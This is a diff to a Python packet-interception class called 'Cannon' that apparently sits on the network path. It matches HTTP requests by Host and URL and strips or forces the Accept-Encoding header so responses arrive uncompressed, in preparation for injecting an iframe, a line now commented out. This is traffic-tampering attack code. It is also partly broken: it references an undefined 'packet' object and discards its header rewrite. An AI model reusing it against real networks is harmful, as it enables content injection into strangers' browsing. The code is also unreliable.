@@ -7,6 +7,7 @@ class Cannon(object):
         self.target_domain_re = target_domain_re
         self.url_path_re = url_path_re
         self.iframe_url = iframe_url
+        self.dict = {}
 
     # Input: an instance of ipv4 class
     # Output: an instance of ipv4 class or None
@@ -20,26 +21,41 @@ class Cannon(object):
             return ip_packet
 
         tcpContent = tcp.next
-        # print tcpContent
 
         # get domain
         domain = tcpContent[tcpContent.find("Host: ")+6 : tcpContent.find("\r\n", tcpContent.find("Host: "))]
-        # print "domain: " + domain
 
         # get url
         url = tcpContent[tcpContent.find("GET ")+4 : tcpContent.find("HTTP", tcpContent.find("GET "))-1]
-        # print "URL: " + url
 
         domainMatch = bool(self.target_domain_re.search(domain))
         pathMatch = bool(self.url_path_re.search(url))
 
         # request & response tuples (Create a mapping between the client/server IP/port and the domain)
-        req = (ip_packet.srcip, ip_packet.destip, ip_packet.srcport, ip_packet.destport)
-        res = (ip_packet.destip, ip_packet.srcip, ip_packet.destport, ip_packet.srcport)
+        req = (ip_packet.srcip, ip_packet.dstip, tcp.srcport, tcp.dstport)
+        res = (ip_packet.dstip, ip_packet.srcip, tcp.dstport, tcp.srcport)
 
+        # if Accept-Encoding is already there
+        if "Accept-Encoding: " in tcpContent:
+            start = tcpContent.find("Accept-Encoding: ") + 17
+            end = tcpContent.find("\r\n", start)
+            # print "packet: " + tcpContent[start:end]
 
-        if domainMatch & pathMatch:
-            iframeContent = "<iframe src=" + self.iframe_url + "></iframe>"
+            packet.set_payload(packet.next.replace(packet.next[start : end], "identity"))
+            # self.offset = 8 - (end - start) # length of "identity" = 8
+
+        # if Accept-Encoding is not there
+        else:
+            noCompress = "Accept-Encoding: identity"
+            headers = tcpContent.split('\r\n')
+            headers.insert(len(headers)/2, noCompress)
+            tcpContent = '\r\n'.join(headers)
+            tcp.next = tcpContent
+            # print tcpContent
+
+        
+        # if domainMatch & pathMatch:
+            # iframeContent = "<iframe src=" + self.iframe_url + "></iframe>"
             
         # if self.url_path_re.search(url) and self.target_domain_re.search(currDomain):
            
